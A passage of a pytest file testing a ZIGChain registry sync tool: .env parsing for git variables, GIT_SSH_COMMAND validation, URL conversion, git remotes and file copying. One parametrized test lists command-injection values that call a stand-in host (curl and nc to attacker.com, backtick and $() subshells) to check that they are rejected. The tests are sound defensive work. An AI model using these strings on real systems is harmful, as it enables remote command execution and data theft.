    env_file.write_text("GIT_AUTHOR_NAME=Dev\nGIT_AUTHOR_EMAIL\n", encoding="utf-8")

    result = _load_git_env_from_env_file(env_file)

    # The broken line does not appear and does not prevent the valid line from parsing
    assert "GIT_AUTHOR_EMAIL" not in result
    assert result.get("GIT_AUTHOR_NAME") == "Dev"


def test_load_git_env_from_env_file_value_with_equals_preserved(tmp_path: Path) -> None:
    """Values that contain '=' are preserved (only first '=' is the delimiter)."""

    env_file = tmp_path / ".env"
    env_file.write_text("GIT_SSH_COMMAND=ssh -i key=value\n", encoding="utf-8")
    result = _load_git_env_from_env_file(env_file)
    assert result.get("GIT_SSH_COMMAND") == "ssh -i key=value"


def test_load_git_env_from_env_file_spaces_around_equals_are_stripped(tmp_path: Path) -> None:
    """'KEY = value' with spaces around '=' is treated the same as 'KEY=value'.

    k.strip() and v.strip() normalise both sides so whitespace in the file
    does not cause the key to be missed or the value to have leading spaces.
    """

    env_file = tmp_path / ".env"
    env_file.write_text("GIT_AUTHOR_NAME = Dave\n", encoding="utf-8")

    result = _load_git_env_from_env_file(env_file)

    assert result.get("GIT_AUTHOR_NAME") == "Dave"


def test_load_git_env_from_env_file_double_equals_typo_is_corrected(tmp_path: Path) -> None:
    """'KEY==value' (accidental double equals) is corrected to 'value'.

    The parser strips leading '=' characters from the value, so the common
    typo of writing == instead of = still produces the intended value.
    """

    env_file = tmp_path / ".env"
    env_file.write_text("GIT_AUTHOR_NAME==Eve\n", encoding="utf-8")

    result = _load_git_env_from_env_file(env_file)

    assert result.get("GIT_AUTHOR_NAME") == "Eve"


def test_load_git_env_from_env_file_empty_value_is_excluded(tmp_path: Path) -> None:
    """A key with no value ('KEY=') is not added to the result.

    The 'and v' guard in the function prevents empty strings from being stored,
    so callers never receive a key mapped to an empty string.
    """

    env_file = tmp_path / ".env"
    # GIT_AUTHOR_NAME has no value; GIT_AUTHOR_EMAIL has a real value
    env_file.write_text("GIT_AUTHOR_NAME=\nGIT_AUTHOR_EMAIL=dev@example.com\n", encoding="utf-8")

    result = _load_git_env_from_env_file(env_file)

    assert "GIT_AUTHOR_NAME" not in result
    assert result.get("GIT_AUTHOR_EMAIL") == "dev@example.com"



def test_load_git_env_from_env_file_quotes_are_preserved_as_is(tmp_path: Path) -> None:
    """Quotes around values are not stripped — they are stored verbatim.

    The docstring explicitly states 'Quotes are preserved as-is (simple parser)'.
    A caller who writes GIT_AUTHOR_NAME="Alice" will receive the value with
    the quote characters included. This is intentional: the function is not a
    full dotenv parser.
    """

    env_file = tmp_path / ".env"
    env_file.write_text('GIT_AUTHOR_NAME="Alice Wonderland"\n', encoding="utf-8")

    result = _load_git_env_from_env_file(env_file)

    # The quotes are part of the stored value — not stripped
    assert result.get("GIT_AUTHOR_NAME") == '"Alice Wonderland"'


def test_load_git_env_from_env_file_only_comments_and_blanks_returns_empty_dict(tmp_path: Path) -> None:
    """A file containing only comments and blank lines returns an empty dict."""

    env_file = tmp_path / ".env"
    env_file.write_text("# comment one\n\n# comment two\n\n", encoding="utf-8")

    result = _load_git_env_from_env_file(env_file)

    assert result == {}


def test_load_git_env_from_env_file_injection_attempt_in_key_name_is_excluded(tmp_path: Path) -> None:
    """A key name containing spaces or shell characters is not in _GIT_ENV_KEYS and is excluded.

    For example 'GIT_AUTHOR_EMAIL ;evil=yes' parses to key 'GIT_AUTHOR_EMAIL ;evil'
    which does not match any allowed key and is silently dropped.
    """

    env_file = tmp_path / ".env"
    env_file.write_text("GIT_AUTHOR_EMAIL ;evil=injected@attacker.com\n", encoding="utf-8")

    result = _load_git_env_from_env_file(env_file)

    # The malformed key is not in _GIT_ENV_KEYS — no entry is stored
    assert result == {}


@pytest.mark.parametrize(
    "malicious_value,attack_name",
    [
        ("ssh -o ProxyCommand=curl https://attacker.com", "ProxyCommand"),
        ("ssh; curl attacker.com", "semicolon"),
        ("ssh | nc attacker.com 1234", "pipe"),
        ("ssh `curl attacker.com`", "backtick"),
        ("ssh $(/bin/evil)", "dollar-subshell"),
    ],
    ids=["ProxyCommand", "semicolon", "pipe", "backtick", "dollar-subshell"],
)
def test_load_git_env_from_env_file_git_ssh_command_metacharacters_rejected(
    tmp_path: Path,
    malicious_value: str,
    attack_name: str,
) -> None:
    """Each shell metacharacter pattern in GIT_SSH_COMMAND triggers ValueError."""

    env_file = tmp_path / ".env"
    env_file.write_text(f"GIT_SSH_COMMAND={malicious_value}\n", encoding="utf-8")

    with pytest.raises(ValueError) as exc:
        _load_git_env_from_env_file(env_file)

    # Full-message assertion — includes the offending value for debugging
    assert exc.value.args[0] == f"GIT_SSH_COMMAND contains unsafe characters or patterns: {malicious_value!r}"


######################################################################
# Tests for _prepare_git_env
######################################################################


def test_prepare_git_env_without_file_returns_overrides_from_os_env(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """_prepare_git_env overlays current process env for _GIT_ENV_KEYS when no file given."""

    monkeypatch.setenv("GIT_AUTHOR_EMAIL", "ci@test.com")
    result = _prepare_git_env(root=tmp_path, git_env_file=None)
    assert result.get("GIT_AUTHOR_EMAIL") == "ci@test.com"



def test_prepare_git_env_nonexistent_file_returns_empty_or_env_only(
    tmp_path: Path,
) -> None:
    """_prepare_git_env with git_env_file pointing to missing file does not crash."""

    result = _prepare_git_env(root=tmp_path, git_env_file=tmp_path / "missing.env")
    assert isinstance(result, dict)
    # _prepare_git_env must never return keys outside the allowed set.
    # Check each key individually so a failure message names the unexpected key.
    for key in result:
        assert key in _GIT_ENV_KEYS, f"unexpected key '{key}' is not an allowed git env var"



def test_prepare_git_env_auto_discovers_root_env_file(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """When git_env_file=None, _prepare_git_env looks for root/.env automatically.

    If that file exists it is loaded — the caller does not need to pass an
    explicit path.
    """

    # Arrange: write a .env file directly in the root directory
    env_file = tmp_path / ".env"
    env_file.write_text("GIT_AUTHOR_NAME=AutoLoaded\n", encoding="utf-8")

    # Make sure the process env does not interfere with the assertion
    monkeypatch.delenv("GIT_AUTHOR_NAME", raising=False)

    # Act: pass None so the function has to discover the file itself
    result = _prepare_git_env(root=tmp_path, git_env_file=None)

    # Assert: the value from the auto-discovered file is present
    assert result.get("GIT_AUTHOR_NAME") == "AutoLoaded"


def test_prepare_git_env_explicit_file_is_loaded(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """When git_env_file is provided, that file is read instead of root/.env.

    Both files exist — the explicit one wins.
    """

    # Arrange: a root/.env with one value and an explicit file with a different value
    (tmp_path / ".env").write_text("GIT_AUTHOR_NAME=FromRoot\n", encoding="utf-8")
    explicit = tmp_path / "ci.env"
    explicit.write_text("GIT_AUTHOR_NAME=FromExplicit\n", encoding="utf-8")

    monkeypatch.delenv("GIT_AUTHOR_NAME", raising=False)

    # Act: pass the explicit file path
    result = _prepare_git_env(root=tmp_path, git_env_file=explicit)

    # Assert: the explicit file's value is used, not the root .env
    assert result.get("GIT_AUTHOR_NAME") == "FromExplicit"


def test_prepare_git_env_process_env_wins_over_file_value(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Process environment variables take priority over the same key in the .env file.

    This lets CI systems inject their own git identity by setting env vars,
    overriding whatever is written in the committed .env file.
    """

    # Arrange: file has one value, process env has a different value for the same key
    env_file = tmp_path / ".env"
    env_file.write_text("GIT_AUTHOR_NAME=FromFile\n", encoding="utf-8")
    monkeypatch.setenv("GIT_AUTHOR_NAME", "FromEnv")

    # Act
    result = _prepare_git_env(root=tmp_path, git_env_file=env_file)

    # Assert: the process env value wins
    assert result.get("GIT_AUTHOR_NAME") == "FromEnv"


def test_prepare_git_env_empty_env_var_does_not_override_file_value(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """An env var that exists but is empty is ignored — the file value is kept.

    The 'and os.environ[k]' guard means an empty string in the environment
    cannot accidentally wipe out a value that was loaded from the file.
    """

    # Arrange: file has a real value; process env has the same key set to empty
    env_file = tmp_path / ".env"
    env_file.write_text("GIT_AUTHOR_NAME=FromFile\n", encoding="utf-8")
    monkeypatch.setenv("GIT_AUTHOR_NAME", "")

    # Act
    result = _prepare_git_env(root=tmp_path, git_env_file=env_file)

    # Assert: the empty env var is ignored; the file value survives
    assert result.get("GIT_AUTHOR_NAME") == "FromFile"


def test_prepare_git_env_tilde_in_git_ssh_command_is_expanded(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """_prepare_git_env calls os.path.expanduser on GIT_SSH_COMMAND so a leading '~'
    is replaced with the real home directory path before git receives it."""

    # Arrange: GIT_SSH_COMMAND is a path to a wrapper script starting with ~
    env_file = tmp_path / ".env"
    env_file.write_text("GIT_SSH_COMMAND=~/.ssh/my-wrapper\n", encoding="utf-8")
    monkeypatch.delenv("GIT_SSH_COMMAND", raising=False)

    # Act
    result = _prepare_git_env(root=tmp_path, git_env_file=env_file)

    ssh_cmd = result.get("GIT_SSH_COMMAND", "")

    # Assert: ~ is gone and replaced with the real home path
    assert "~" not in ssh_cmd
    assert ".ssh/my-wrapper" in ssh_cmd


def test_prepare_git_env_no_git_ssh_command_does_not_raise(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """When GIT_SSH_COMMAND is not set anywhere, _prepare_git_env completes without error.

    The 'if ssh_cmd:' guard must skip the expanduser call cleanly.
    """

    # Arrange: no GIT_SSH_COMMAND in file or process env
    env_file = tmp_path / ".env"
    env_file.write_text("GIT_AUTHOR_NAME=Dev\n", encoding="utf-8")
    monkeypatch.delenv("GIT_SSH_COMMAND", raising=False)

    # Act: must not raise
    result = _prepare_git_env(root=tmp_path, git_env_file=env_file)

    # Assert: key is simply absent
    assert "GIT_SSH_COMMAND" not in result


def test_prepare_git_env_no_file_no_env_vars_returns_empty_dict(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """When there is no .env file and none of the _GIT_ENV_KEYS are set in the
    process environment, the result is an empty dict.

    _prepare_git_env must never raise in this fully-unconfigured state.
    """

    # Arrange: remove all allowed git env vars from the process environment
    for key in _GIT_ENV_KEYS:
        monkeypatch.delenv(key, raising=False)

    # Act: no file, no env vars
    result = _prepare_git_env(root=tmp_path, git_env_file=None)

    # Assert: nothing to return — empty dict
    assert result == {}


######################################################################
# Tests for _github_https_to_ssh
######################################################################

def test_github_https_to_ssh_converts_https_to_ssh() -> None:
    """_github_https_to_ssh converts https://github.com/ORG/REPO to git@github.com:ORG/REPO.git."""

    result = _github_https_to_ssh("https://github.com/ZIGChain/chain-registry")
    assert result == "git@github.com:ZIGChain/chain-registry.git"



def test_github_https_to_ssh_returns_none_for_non_github_url() -> None:
    """_github_https_to_ssh returns None for non-GitHub HTTPS URL."""

    assert _github_https_to_ssh("https://gitlab.com/org/repo") is None
    assert _github_https_to_ssh("") is None


def test_github_https_to_ssh_trailing_slash_is_stripped() -> None:
    """A trailing slash after the repo name is stripped before converting.

    The docstring documents this as a supported input format:
    https://github.com/ORG/REPO/ -> git@github.com:ORG/REPO.git
    """

    result = _github_https_to_ssh("https://github.com/ZIGChain/chain-registry/")

    assert result == "git@github.com:ZIGChain/chain-registry.git"


def test_github_https_to_ssh_git_suffix_already_present_is_not_doubled() -> None:
    """A URL that already ends in .git is handled correctly — the suffix is not doubled.

    The docstring documents this as a supported input format:
    https://github.com/ORG/REPO.git -> git@github.com:ORG/REPO.git
    """

    result = _github_https_to_ssh("https://github.com/ZIGChain/chain-registry.git")

    assert result == "git@github.com:ZIGChain/chain-registry.git"


def test_github_https_to_ssh_base_url_only_returns_none() -> None:
    """https://github.com/ with no org or repo returns None.

    After stripping the prefix and slashes, the path is empty — there is
    nothing to convert.
    """

    assert _github_https_to_ssh("https://github.com/") is None


def test_github_https_to_ssh_org_only_no_repo_returns_none() -> None:
    """A URL with only an org and no repo returns None.

    git@github.com:ORG.git is not a valid SSH remote — a repo name is required.
    """

    assert _github_https_to_ssh("https://github.com/ZIGChain") is None


def test_github_https_to_ssh_extra_path_segments_are_ignored() -> None:
    """Only the first two path segments (org and repo) are used.

    A URL like https://github.com/ORG/REPO/tree/main is valid — the extra
    segments after the repo name are silently dropped.
    """

    result = _github_https_to_ssh("https://github.com/ZIGChain/chain-registry/tree/main")

    assert result == "git@github.com:ZIGChain/chain-registry.git"


def test_github_https_to_ssh_leading_and_trailing_whitespace_stripped() -> None:
    """Leading and trailing whitespace around the URL is stripped before processing."""

    result = _github_https_to_ssh("  https://github.com/ZIGChain/chain-registry  ")

    assert result == "git@github.com:ZIGChain/chain-registry.git"


def test_github_https_to_ssh_http_not_https_returns_none() -> None:
    """Plain http:// (not https://) does not match and returns None.

    The check is case-sensitive and prefix-exact — only https://github.com/ passes.
    """

    assert _github_https_to_ssh("http://github.com/ZIGChain/chain-registry") is None



######################################################################
# Tests for _ensure_remote
######################################################################


def test_ensure_remote_adds_remote_when_not_present(tmp_path: Path) -> None:
    """_ensure_remote adds the remote when it does not already exist."""

    # Skip if git is not installed on this machine — the test runs real git commands
    if not shutil.which("git"):
        pytest.skip("git binary not available")

    # Arrange: initialise a fresh repo with no remotes
    subprocess.run(["git", "init", str(tmp_path)], check=True, capture_output=True)

    # Act: ask _ensure_remote to add 'origin' — it does not exist yet
    _ensure_remote(tmp_path, "origin", "https://example.com/repo.git")

    # Assert: ask git directly what URL 'origin' points to
    res = subprocess.run(
        ["git", "remote", "get-url", "origin"],
        cwd=tmp_path,
        capture_output=True,
        text=True,
    )
    # strip() removes the trailing newline that git always adds to its output
    assert res.stdout.strip() == "https://example.com/repo.git"


def test_ensure_remote_updates_existing_remote(tmp_path: Path) -> None:
    """_ensure_remote updates the URL when the remote already exists."""

    # Skip if git is not installed on this machine
    if not shutil.which("git"):
        pytest.skip("git binary not available")

    # Arrange: initialise a repo and add 'origin' with an old URL
    subprocess.run(["git", "init", str(tmp_path)], check=True, capture_output=True)
    subprocess.run(["git", "remote", "add", "origin", "https://old.example.com/repo.git"], cwd=tmp_path, check=True)

    # Act: call _ensure_remote with a new URL — 'origin' already exists so it must update it
    _ensure_remote(tmp_path, "origin", "https://new.example.com/repo.git")

    # Assert: ask git directly — the URL must now be the new one, not the old one
    res = subprocess.run(
        ["git", "remote", "get-url", "origin"],
        cwd=tmp_path,
        capture_output=True,
        text=True,
    )
    assert res.stdout.strip() == "https://new.example.com/repo.git"


def test_ensure_remote_does_not_modify_other_remotes_when_updating(tmp_path: Path) -> None:
    """When updating a named remote, other remotes in the repo are left unchanged.

    The set membership check must only act on the named remote — a repo with
    both 'origin' and 'upstream' must still have 'upstream' untouched after
    _ensure_remote updates 'origin'.
    """

    if not shutil.which("git"):
        pytest.skip("git binary not available")

    subprocess.run(["git", "init", str(tmp_path)], check=True, capture_output=True)
    subprocess.run(["git", "remote", "add", "origin", "https://old.example.com/repo.git"], cwd=tmp_path, check=True)
    subprocess.run(["git", "remote", "add", "upstream", "https://upstream.example.com/repo.git"], cwd=tmp_path, check=True)

    # Act: update only 'origin'
    _ensure_remote(tmp_path, "origin", "https://new.example.com/repo.git")

    # Assert: 'origin' was updated
    origin_url = subprocess.run(
        ["git", "remote", "get-url", "origin"],
        cwd=tmp_path, capture_output=True, text=True,
    ).stdout.strip()
    assert origin_url == "https://new.example.com/repo.git"

    # Assert: 'upstream' was not touched
    upstream_url = subprocess.run(
        ["git", "remote", "get-url", "upstream"],
        cwd=tmp_path, capture_output=True, text=True,
    ).stdout.strip()
    assert upstream_url == "https://upstream.example.com/repo.git"


#--------------------
# Negative test for _ensure_remote
#--------------------

def test_ensure_remote_requires_git_repo(tmp_path: Path) -> None:
    """_ensure_remote raises CalledProcessError when directory is not a git repo."""

    # Skip if git is not installed on this machine
    if not shutil.which("git"):
        pytest.skip("git binary not available")

    # tmp_path is a plain empty directory — git init was never called here,
    # so 'git remote' will fail because there is no .git folder
    with pytest.raises(subprocess.CalledProcessError) as exc:
        _ensure_remote(tmp_path, "origin", "https://example.com/repo.git")

    # returncode is non-zero — git signalled failure
    assert exc.value.returncode != 0
    # the failed command was 'git remote'
    assert exc.value.cmd[:2] == ["git", "remote"]


######################################################################
# Tests for _rm_tree_if_exists
######################################################################


def test_rm_tree_if_exists_removes_directory(tmp_path: Path) -> None:
    """_rm_tree_if_exists removes the path when it exists."""

    # Arrange: create a directory with a file inside
    sub = tmp_path / "subdir"
    sub.mkdir()
    (sub / "file.txt").write_text("x", encoding="utf-8")

    # Act
    _rm_tree_if_exists(sub)

    # Assert: both the directory and its contents are gone
    assert not sub.exists()


def test_rm_tree_if_exists_nonexistent_path_does_nothing(tmp_path: Path) -> None:
    """_rm_tree_if_exists does nothing when path does not exist."""

    # Act: call with a path that was never created — must not raise
    _rm_tree_if_exists(tmp_path / "nonexistent")

    # Assert: path is still absent (nothing was created or changed)
    assert (tmp_path / "nonexistent").exists() is False


def test_rm_tree_if_exists_removes_deeply_nested_tree(tmp_path: Path) -> None:
    """_rm_tree_if_exists removes a directory tree of arbitrary depth.

    shutil.rmtree recurses into all subdirectories — the whole tree is gone,
    not just the top-level directory.
    """

    # Arrange: create a/b/c/file.txt
    deep = tmp_path / "a" / "b" / "c"
    deep.mkdir(parents=True)
    (deep / "file.txt").write_text("nested", encoding="utf-8")

    # Act
    _rm_tree_if_exists(tmp_path / "a")

    # Assert: the entire tree is gone
    assert not (tmp_path / "a").exists()


######################################################################
# Tests for _copy_tree_replace
######################################################################


def test_copy_tree_replace_copies_src_to_dst(tmp_path: Path) -> None:
    """_copy_tree_replace replaces dst with contents of src."""

    # Arrange: src has one file; dst does not exist yet
    src = tmp_path / "src"
    src.mkdir()
    (src / "a.txt").write_text("a", encoding="utf-8")
    dst = tmp_path / "dst"

    # Act
    _copy_tree_replace(src, dst)

    # Assert: the file from src is now present in dst
    assert (dst / "a.txt").read_text() == "a"


def test_copy_tree_replace_src_nonexistent_does_nothing(tmp_path: Path) -> None:
    """_copy_tree_replace does nothing when src does not exist."""

    # Arrange: dst exists with a file; src does not exist
    dst = tmp_path / "dst"
    dst.mkdir()
    (dst / "old.txt").write_text("old", encoding="utf-8")

    # Act: src is missing — function must return early without touching dst
    _copy_tree_replace(tmp_path / "nonexistent", dst)

    # Assert: dst is completely unchanged
    assert (dst / "old.txt").read_text() == "old"


def test_copy_tree_replace_removes_stale_files_in_dst(tmp_path: Path) -> None:
    """Files in dst that are not in src are deleted — the 'replace' guarantee.

    _rm_tree_if_exists wipes dst before copying, so no leftover files survive.
    If this were a merge instead of a replace, stale files would remain.
    """

    # Arrange: dst has a file that does NOT exist in src
    src = tmp_path / "src"
    src.mkdir()
    (src / "new.txt").write_text("new", encoding="utf-8")

    dst = tmp_path / "dst"
    dst.mkdir()
    (dst / "stale.txt").write_text("old content", encoding="utf-8")

    # Act
    _copy_tree_replace(src, dst)

    # Assert: new file is present, stale file is gone
    assert (dst / "new.txt").read_text(encoding="utf-8") == "new"
    assert not (dst / "stale.txt").exists()


def test_copy_tree_replace_creates_missing_parent_directories(tmp_path: Path) -> None:
    """_copy_tree_replace creates the dst parent directories if they do not exist.

    dst.parent.mkdir(parents=True, exist_ok=True) ensures the full path to
    dst is created even if intermediate directories are missing.
    """

    src = tmp_path / "src"
    src.mkdir()
    (src / "file.txt").write_text("content", encoding="utf-8")

    # dst is inside two directories that do not exist yet
    dst = tmp_path / "a" / "b" / "dst"

    # Act: must not raise even though a/b/ does not exist
    _copy_tree_replace(src, dst)

    # Assert: the intermediate parent directories were created
    assert (tmp_path / "a").is_dir()
    assert (tmp_path / "a" / "b").is_dir()
    # Assert: dst itself exists at the expected path and contains the file
    assert dst.is_dir()
    assert (dst / "file.txt").read_text(encoding="utf-8") == "content"


def test_copy_tree_replace_copies_nested_subdirectories(tmp_path: Path) -> None:
    """_copy_tree_replace copies the full directory tree, not just top-level files.

    shutil.copytree recurses into subdirectories so nested structure is preserved.
    """

    # Arrange: src has a nested subdirectory with a file
    src = tmp_path / "src"
    (src / "sub" / "deep").mkdir(parents=True)
    (src / "sub" / "deep" / "file.txt").write_text("nested", encoding="utf-8")

    dst = tmp_path / "dst"

    # Act
    _copy_tree_replace(src, dst)

    # Assert: nested file is present at the same relative path
    assert (dst / "sub" / "deep" / "file.txt").read_text(encoding="utf-8") == "nested"


######################################################################
# Tests for _copy_images_merge
######################################################################


def test_copy_images_merge_copies_files_and_returns_count(tmp_path: Path) -> None:
    """_copy_images_merge copies image files from src to dst and returns count."""

    src = tmp_path / "src_img"
    src.mkdir()
    (src / "1.png").write_text("x", encoding="utf-8")
    (src / "2.svg").write_text("x", encoding="utf-8")
    dst = tmp_path / "dst_img"
    count = _copy_images_merge(src, dst)
    assert count == 2
    assert (dst / "1.png").exists()
    assert (dst / "2.svg").exists()


def test_copy_images_merge_src_nonexistent_returns_zero(tmp_path: Path) -> None:
    """_copy_images_merge returns 0 when src dir does not exist."""

    count = _copy_images_merge(tmp_path / "nonexistent", tmp_path / "dst")
    assert count == 0


def test_copy_images_merge_creates_dst_when_missing(tmp_path: Path) -> None:
    """_copy_images_merge creates the dst directory when it does not exist yet.

    dst_images_dir.mkdir(parents=True, exist_ok=True) runs before any copy,
    so the caller does not need to create the destination folder first.
    """

    # Arrange: src has one image; dst does not exist
    src = tmp_path / "src"
    src.mkdir()
    (src / "zig.png").write_text("img", encoding="utf-8")

    dst = tmp_path / "dst"

    # Act
    _copy_images_merge(src, dst)

    # Assert: dst was created and the file is inside it
    assert dst.is_dir()
    assert (dst / "zig.png").exists()


def test_copy_images_merge_skips_subdirectories_in_src(tmp_path: Path) -> None:
    """_copy_images_merge only copies files — subdirectories inside src are skipped.

    The 'if not p.is_file(): continue' guard means nested folders are ignored.
    Only the count of copied files is returned, so a subdirectory does not
    increase the count.
    """

    # Arrange: src has one file and one subdirectory
    src = tmp_path / "src"
    src.mkdir()
    (src / "zig.png").write_text("img", encoding="utf-8")
    (src / "subdir").mkdir()  # this should be skipped

    dst = tmp_path / "dst"

    # Act
    count = _copy_images_merge(src, dst)

    # Assert: only the file was counted; the subdirectory was not copied
    assert count == 1
    assert not (dst / "subdir").exists()


def test_copy_images_merge_does_not_delete_existing_dst_files(tmp_path: Path) -> None:
    """_copy_images_merge is a merge — existing files in dst are kept.

    Unlike _copy_tree_replace, this function does NOT wipe dst first.
    A file already in dst that is not in src will still be there after the call.
    """

    # Arrange: dst already has a file; src has a different file
    src = tmp_path / "src"
    src.mkdir()
    (src / "new.png").write_text("new", encoding="utf-8")

    dst = tmp_path / "dst"
    dst.mkdir()
    (dst / "existing.png").write_text("existing", encoding="utf-8")

    # Act
    _copy_images_merge(src, dst)

    # Assert: the new file was added AND the existing file was not deleted
    assert (dst / "new.png").exists()
    assert (dst / "existing.png").exists()


def test_copy_images_merge_empty_src_returns_zero(tmp_path: Path) -> None:
    """_copy_images_merge returns 0 when src exists but contains no files."""

    # Arrange: src exists but is empty
    src = tmp_path / "src"
    src.mkdir()
    dst = tmp_path / "dst"

    # Act
    count = _copy_images_merge(src, dst)

    # Assert: nothing was copied
    assert count == 0


######################################################################
# Tests for _sync_chain_folder
######################################################################

def test_sync_chain_folder_copies_assetlist_and_images(tmp_path: Path) -> None:
    """_sync_chain_folder copies assetlist.json and images/ from src to dst."""

    # Arrange: src has both assetlist.json and an images/ folder with one image
    src = tmp_path / "src" / "zigchain"
    src.mkdir(parents=True)
    (src / "assetlist.json").write_text('{"chain_name": "zigchain", "assets": []}', encoding="utf-8")
    src_images = src / "images"
    src_images.mkdir()
    (src_images / "zig.png").write_text("img", encoding="utf-8")

    # Act: sync src into a dst that does not exist yet
    dst = tmp_path / "dst" / "zigchain"
    _sync_chain_folder(src, dst)

    # Assert: both assetlist.json and images/zig.png appear in dst
    assert (dst / "assetlist.json").exists()
    assert (dst / "images" / "zig.png").exists()


def test_sync_chain_folder_copies_assetlist_only_when_no_images(tmp_path: Path) -> None:
    """_sync_chain_folder copies assetlist.json even when images/ does not exist."""

    # Arrange: src has assetlist.json but no images/ directory
    src = tmp_path / "src" / "zigchain"
    src.mkdir(parents=True)
    (src / "assetlist.json").write_text('{"chain_name": "zigchain", "assets": []}', encoding="utf-8")

    # Act
    dst = tmp_path / "dst" / "zigchain"
    _sync_chain_folder(src, dst)

    # Assert: assetlist was copied; no images/ folder was created in dst
    assert (dst / "assetlist.json").exists()
    assert not (dst / "images").exists()


def test_sync_chain_folder_src_missing_does_not_create_dst(tmp_path: Path) -> None:
    """_sync_chain_folder does nothing when src_chain_dir does not exist."""

    # Arrange: src path does not exist on disk
    src = tmp_path / "nonexistent" / "zigchain"
    dst = tmp_path / "dst" / "zigchain"

    # Act: call with a missing src — the function should return early
    _sync_chain_folder(src, dst)

    # Assert: dst was never created (early-return guard worked)
    assert not dst.exists()


def test_sync_chain_folder_overwrites_existing_assetlist(tmp_path: Path) -> None:
    """_sync_chain_folder replaces an existing assetlist.json in dst with the new one.

    shutil.copyfile overwrites the destination file — the old content must be gone.
    """

    # Arrange: dst already has an assetlist with old content
    src = tmp_path / "src" / "zigchain"
    src.mkdir(parents=True)
    (src / "assetlist.json").write_text('{"assets": ["new"]}', encoding="utf-8")

    dst = tmp_path / "dst" / "zigchain"
    dst.mkdir(parents=True)
    (dst / "assetlist.json").write_text('{"assets": ["old"]}', encoding="utf-8")

    # Act
    _sync_chain_folder(src, dst)

    # Assert: the assetlist now contains the new content, not the old
    data = json.loads((dst / "assetlist.json").read_text(encoding="utf-8"))
    assert data["assets"] == ["new"]


def test_sync_chain_folder_does_not_copy_other_files(tmp_path: Path) -> None:
    """_sync_chain_folder only copies assetlist.json and images/ — other files are ignored.

    chain.json and any other upstream files that live in the chain folder must
    not be overwritten by this function.
    """

    # Arrange: src has assetlist.json AND an extra file that must not be copied
    src = tmp_path / "src" / "zigchain"
    src.mkdir(parents=True)
    (src / "assetlist.json").write_text('{"assets": []}', encoding="utf-8")
    (src / "chain.json").write_text('{"chain": "data"}', encoding="utf-8")

    dst = tmp_path / "dst" / "zigchain"

    # Act
    _sync_chain_folder(src, dst)

    # Assert: assetlist.json was copied but chain.json was not
    assert (dst / "assetlist.json").exists()
    assert not (dst / "chain.json").exists()


def test_sync_chain_folder_creates_dst_when_missing(tmp_path: Path) -> None:
    """_sync_chain_folder creates the dst directory if it does not exist.

    dst_chain_dir.mkdir(parents=True, exist_ok=True) is called before writing
    assetlist.json so the caller does not need to create the folder first.
    """

    # Arrange: src exists; dst does not
    src = tmp_path / "src" / "zigchain"
    src.mkdir(parents=True)
    (src / "assetlist.json").write_text('{"assets": []}', encoding="utf-8")

    dst = tmp_path / "dst" / "zigchain"  # does not exist yet

    # Act
    _sync_chain_folder(src, dst)

    # Assert: dst was created and the file is inside it
    assert dst.is_dir()
    assert (dst / "assetlist.json").exists()



def test_sync_chain_folder_stale_image_in_dst_is_removed(tmp_path: Path) -> None:
    """_sync_chain_folder replaces the entire images/ tree — stale files in dst are removed.

    _copy_tree_replace wipes dst/images before copying from src so files that
    exist in the old dst but not in the new src do not linger.
    """

    # Arrange: dst already has an image that src no longer contains
    src = tmp_path / "src" / "zigchain"
    src.mkdir(parents=True)
    (src / "assetlist.json").write_text("{}", encoding="utf-8")
    src_images = src / "images"
    src_images.mkdir()
    (src_images / "new_token.png").write_text("new", encoding="utf-8")

    dst = tmp_path / "dst" / "zigchain"
    dst.mkdir(parents=True)
    dst_images = dst / "images"
    dst_images.mkdir()
    (dst_images / "old_token.png").write_text("stale", encoding="utf-8")

    # Act
    _sync_chain_folder(src, dst)

    # Assert: new image is present; stale image was removed by the full replace
    assert (dst / "images" / "new_token.png").exists()
    assert not (dst / "images" / "old_token.png").exists()


#--------------------
# Negative test for _sync_chain_folder
#--------------------

def test_sync_chain_folder_assetlist_is_a_directory_raises(tmp_path: Path) -> None:
    """_sync_chain_folder raises when src assetlist.json is a directory instead of a file.

    shutil.copyfile cannot copy a directory — it raises IsADirectoryError (or
    PermissionError on some systems).  This test documents that the function
    does not guard against this edge case.
    """

    # Arrange: create a directory named assetlist.json in src
    src = tmp_path / "src" / "zigchain"
    src.mkdir(parents=True)
    (src / "assetlist.json").mkdir()  # directory, not a file

    dst = tmp_path / "dst" / "zigchain"

    # Act: shutil.copyfile raises because the source path is a directory, not a file
    with pytest.raises(IsADirectoryError) as exc:
        _sync_chain_folder(src, dst)


    # Assert: errno 21 = EISDIR, strerror matches, and the offending path is reported
    assert exc.value.errno == 21
    assert exc.value.strerror == "Is a directory"
    assert str(src / "assetlist.json") in exc.value.filename


######################################################################
# Tests for _timestamped_branch
######################################################################

def test_timestamped_branch_returns_string_with_prefix() -> None:
    """_timestamped_branch returns string starting with prefix and containing timestamp."""

    result = _timestamped_branch(prefix="zigchain-sync")
    assert result.startswith("zigchain-sync-")
    assert len(result) > len("zigchain-sync-")


def test_timestamped_branch_default_prefix_is_zigchain_sync() -> None:
    """_timestamped_branch uses 'zigchain-sync' as the default prefix when none is given."""

    # Act: call with no arguments
    result = _timestamped_branch()

    # Assert: the result starts with the default prefix
    assert result.startswith("zigchain-sync-")


def test_timestamped_branch_custom_prefix_is_used() -> None:
    """_timestamped_branch uses whatever prefix the caller passes in."""

    result = _timestamped_branch(prefix="my-custom-prefix")

    assert result.startswith("my-custom-prefix-")


def test_timestamped_branch_timestamp_matches_expected_format() -> None:
    """The timestamp portion of the branch name follows YYYYMMDD-HHMMSS format.

    The format string is '%Y%m%d-%H%M%S' which produces exactly 15 characters
    (8 digits, a dash, 6 digits). This test verifies the shape of the output
    so a change to the format string does not go unnoticed.
    It also checks that the embedded date matches the actual current date so a
    wrong strftime format (e.g. swapped month/day) is caught immediately.
    """
    import datetime

    # Arrange
    result = _timestamped_branch(prefix="test")

    # Remove the prefix and dash to get just the timestamp portion
